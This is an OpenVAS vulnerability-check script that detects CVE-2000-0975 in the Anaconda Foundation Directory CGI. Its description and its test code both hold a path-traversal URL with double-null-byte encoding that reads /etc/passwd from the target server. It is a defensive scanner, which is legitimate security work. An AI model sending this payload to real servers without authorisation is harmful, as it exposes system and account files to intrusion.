# OpenVAS Vulnerability Test
# $Id: anaconda_doublenull.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Anaconda Double NULL Encoded Remote File Retrieval
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote Anaconda Foundation Directory contains a flaw
that allows anyone to read arbitrary files with root (super-user) 
privileges, by embedding a double null byte in a URL, as in :

http://www.example.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../..../../etc/passwd%%0000.html&passurl=/category/";

tag_solution = "Contact your vendor for updated software.";

if(description)
{
 script_id(15749);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2000-0975");
 script_bugtraq_id(2338);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 
 name = "Anaconda Double NULL Encoded Remote File Retrieval";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Anaconda Foundation Directory Double NULL Encoded Remote File Retrieval";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (make_list("/cgi-local", cgi_dirs()))
{
  item = string(dir,"/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%%0000.html&passurl=/category/");
  buf = http_get(item:item, port:port);
  rep = http_keepalive_send_recv(port:port, data:buf);
  if( rep == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  	{
  	security_warning(port);
	exit(0);
	}
}
